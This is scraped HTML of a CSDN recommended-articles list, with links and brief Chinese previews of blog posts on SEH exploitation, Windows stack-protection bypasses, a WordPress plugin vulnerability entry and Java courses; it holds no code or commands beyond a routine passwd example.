<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/lixiangminghate/article/details/47961773"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-5.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"5","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/lixiangminghate/article/details/47961773"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/lixiangminghate/article/details/47961773" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-5.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"5","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/lixiangminghate/article/details/47961773"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-5.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-5.control'>
					简单演示<em>Exploit</em> <em>SEH</em>原理(未开启Safe<em>SEH</em>模块)
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/lixiangminghate" target="_blank"><span class="blog-title">lixiangminghate的专栏</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">08-24</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					1199
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/lixiangminghate/article/details/47961773" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-5.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"5","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/lixiangminghate/article/details/47961773"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-5.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-5.control'>
				<div class="desc ellipsis-online ellipsis-online-1">前面写了不少<em>SEH</em>相关文章，这里来个复杂点的栈溢出<em>SEH</em>。文章不重复解释<em>SEH</em>运行原理，但对主要步骤加以调试和注释，另外本文参考考了雪上 <em>Exploit</em> 编写系列教程第三篇_基于<em>SEH</em>的<em>Exploit</em> 一文。一般来说<em>Exploit</em>重在溢出，不过本文旨在是演示<em>Exploit</em> <em>SEH</em>的原理，因此省略溢出过程直接在栈上修改。
程序源码(vc++6.0 Debug版本)如下: &nbsp;&nbsp; 
#include</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/hack8/article/details/6069859"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-6.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"6","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hack8/article/details/6069859"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/hack8/article/details/6069859" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-6.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"6","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hack8/article/details/6069859"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control'>
					windows溢出保护原理与<em>绕过</em>方法概览
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/hack8" target="_blank"><span class="blog-title">瞎几把学</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">12-11</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					752
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/hack8/article/details/6069859" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-6.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"6","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hack8/article/details/6069859"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control'>
				<div class="desc ellipsis-online ellipsis-online-1">&lt;br /&gt;作者：riusksk（泉哥）&lt;br /&gt;本文已发表于《黑客防线》&lt;br /&gt;&lt;br /&gt;前言&lt;br /&gt;从20世纪80年代开始，在国外就有人开始讨论关于溢出的攻击方式。但是在当时并没有引起人们的注意，直至后来经一些研究人员的披露后，特别是著名黑客杂志Phrack上面关于溢出的经典文章，引领许多人步入溢出研究的行列，从此关于缓冲区溢出的问题才为人们所重视。随着溢出研究的深入，网上开始出现很多关于溢出攻击教程，揭露了许多溢出利用技术，特别是经典的call/jmp esp，借此溢出攻击案例层出不穷。这</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/weixin_34379433/article/details/87981101"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-7.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"7","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_34379433/article/details/87981101"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/weixin_34379433/article/details/87981101" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-7.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"7","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_34379433/article/details/87981101"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-7.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-7.control'>
					<em>Exploit</em>开发系列教程-Mona 2&amp; <em>SEH</em>
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/weixin_34379433" target="_blank"><span class="blog-title">weixin_34379433的博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">03-08</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					102
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/weixin_34379433/article/details/87981101" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-7.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"7","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_34379433/article/details/87981101"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-7.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-7.control'>
				<div class="desc ellipsis-online ellipsis-online-1">P3nro5e &middot; 2015/07/10 10:580x00 Mona 2 前言 &amp;amp; 准备Mona 2是一种非常有用的插件，它由Corelan Team开发。起初是为Immunity Debugger写的，现在它适用于WinDbg调试器。你将需要为WinDbg x86 和 WinDbg x64安装一些工具：安装Python 2.7 (从这里可下载到) 。x86 和 x64版本的工具分别安装...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/chengkou8481/article/details/100781453"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-8.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"8","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/chengkou8481/article/details/100781453"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/chengkou8481/article/details/100781453" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-8.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"8","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/chengkou8481/article/details/100781453"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-8.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-8.control'>
					windows溢出保护原理与<em>绕过</em>方法概览(转自riusksk&#39;s blog(泉哥))
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/chengkou8481" target="_blank"><span class="blog-title">chengkou8481的博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">03-09</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					61
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/chengkou8481/article/details/100781453" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-8.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"8","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/chengkou8481/article/details/100781453"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-8.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-8.control'>
				<div class="desc ellipsis-online ellipsis-online-1">前言 从20世纪80年代开始，在国外就有人开始讨论关于溢出的攻击方式。但是在当时并没有引起人们的注意，直至后来经一些研究人员的披露后，特别是著名黑客杂 志Phrack上面关于溢出的经典文章，引领许多人步入溢出研究的行列，从此关于缓冲区溢出的问题才为人们所重视。随着溢出研究的深入，网上开始出现...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/weixin_30409849/article/details/97765644"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-9.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"9","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30409849/article/details/97765644"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/weixin_30409849/article/details/97765644" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-9.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"9","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30409849/article/details/97765644"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-9.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-9.control'>
					WordPress <em>Exploit</em> Scanner插件安全<em>绕过</em>漏洞
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/weixin_30409849" target="_blank"><span class="blog-title">weixin_30409849的博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">06-01</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					67
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/weixin_30409849/article/details/97765644" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-9.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"9","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30409849/article/details/97765644"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-9.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-9.control'>
				<div class="desc ellipsis-online ellipsis-online-1">漏洞名称：
WordPress <em>Exploit</em> Scanner插件安全<em>绕过</em>漏洞


CNNVD编号：
CNNVD-201305-642


发布时间：
2013-05-31


更新时间：
2013-05-31


危害等级：



漏洞类型：
权限许可和访问控制


威胁类型：
远程


CVE编号：...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/weixin_30920853/article/details/98725505"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-10.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"10","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30920853/article/details/98725505"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/weixin_30920853/article/details/98725505" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-10.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"10","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30920853/article/details/98725505"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-10.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-10.control'>
					各种保护机制<em>绕过</em>手法
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/weixin_30920853" target="_blank"><span class="blog-title">weixin_30920853的博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">09-17</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					75
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/weixin_30920853/article/details/98725505" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-10.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"10","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/weixin_30920853/article/details/98725505"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-10.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-10.control'>
				<div class="desc ellipsis-online ellipsis-online-1">各种保护机制<em>绕过</em>手法
一.<em>绕过</em>GS编译选项
●原理:通过VC++编译器在函数前后添加额外的处理代码，前部分用于由伪随机数生成的<em>cookie</em>并放入.data节段，当本地变量初始化，就会向栈中插入<em>cookie</em>，它位于局部变量和返回地址之间

●<em>绕过</em>方法:
1.猜测/计算<em>cookie</em>
ReducingtheEffecti...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/dupei/article/details/6243421"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-11.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"11","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/dupei/article/details/6243421"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/dupei/article/details/6243421" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-11.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"11","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/dupei/article/details/6243421"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-11.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-11.control'>
					修改帐号登录密码
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/dupei" target="_blank"><span class="blog-title">MD的技术博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">03-12</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					714
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/dupei/article/details/6243421" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-11.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"11","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/dupei/article/details/6243421"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-11.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-11.control'>
				<div class="desc ellipsis-online ellipsis-online-1">&lt;br /&gt;<em>使用</em>passwd命令修改密码：&lt;br /&gt;[root@localhost ~]# passwd&lt;br /&gt;
Changing password for user root.&lt;br /&gt;
New UNIX password: &lt;br /&gt;</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_course clearfix" data-url="https://edu.csdn.net/course/detail/3044"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-12.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"12","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/course/detail/3044"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://edu.csdn.net/course/detail/3044" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-12.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"12","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/course/detail/3044"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-12.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-12.control'>
					Java8零基础入门视频教程
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info display-flex">
					<span class="info-block">09-29</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://edu.csdn.net/course/detail/3044" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-12.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"12","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/course/detail/3044"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-12.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-12.control'>
				<div class="desc ellipsis-online ellipsis-online-1">这门课程基于主流的java8平台，由浅入深的详细讲解了java SE的开发技术，可以使java方向的入门学员，快速扎实的掌握java开发技术！</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_course clearfix" data-url="https://edu.csdn.net/combo/detail/425"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-13.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"13","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/combo/detail/425"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://edu.csdn.net/combo/detail/425" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-13.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"13","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/combo/detail/425"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-13.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-13.control'>
					JavaEE+大数据+2个实战项目终极套餐震撼来袭
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info display-flex">
					<span class="info-block">05-19</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://edu.csdn.net/combo/detail/425" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-course-2~default~BlogCommendHotData~default-13.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"13","strategy":"2~default~BlogCommendHotData~default","dest":"https://edu.csdn.net/combo/detail/425"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-13.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-course-2%7Edefault%7EBlogCommendHotData%7Edefault-13.control'>
				<div class="desc ellipsis-online ellipsis-online-1">该套视频教程共包含16门课程，分别是Linux入门到精通、大型ERP项目实战教程、solr教程、Lucene教学视频、Java反射与注解开发、Hadoop大数据入门教程、Activiti工作流教程、redis高并发由浅入深、webservice入门教程、hibernate4入门教程、大型分布式redis+solr+Linux+nginx+springmvc+mybatis电商项目、struts2深入浅出、oracle入门到大神、springmvc深入浅出、spring 3.2教程、mybatis入门到精通教程、Java EE教程、Mysql教程。</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://qilinzi.blog.csdn.net/article/details/89464475"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-14.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"14","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://qilinzi.blog.csdn.net/article/details/89464475"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://qilinzi.blog.csdn.net/article/details/89464475" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-14.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"14","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://qilinzi.blog.csdn.net/article/details/89464475"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-14.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-14.control'>
					<em>security</em> <em>cookie</em>
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/qq_36720848" target="_blank"><span class="blog-title">麒麟子官方博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">05-09</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					2114
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://qilinzi.blog.csdn.net/article/details/89464475" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-14.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"14","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://qilinzi.blog.csdn.net/article/details/89464475"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-14.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-14.control'>
				<div class="desc ellipsis-online ellipsis-online-1"><em>security</em> <em>cookie</em>
		
		
		
			在微软的c/c++ 编译器中，增加了对于栈溢出进行检测的参数 &ldquo;/GS&rdquo;，在调试shellcode 的时候，发现vs2005 产生的code 和 vc6 产生的code 有些不同，才让我注意到这个问题。
 写了这样的一个测试程序：
 void foo(const char * datas) 
...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/encesu/article/details/93486200"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"15","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/encesu/article/details/93486200"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/encesu/article/details/93486200" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"15","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/encesu/article/details/93486200"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-15.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-15.control'>
					__<em>security</em>_check_<em>cookie</em> 解决办法
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
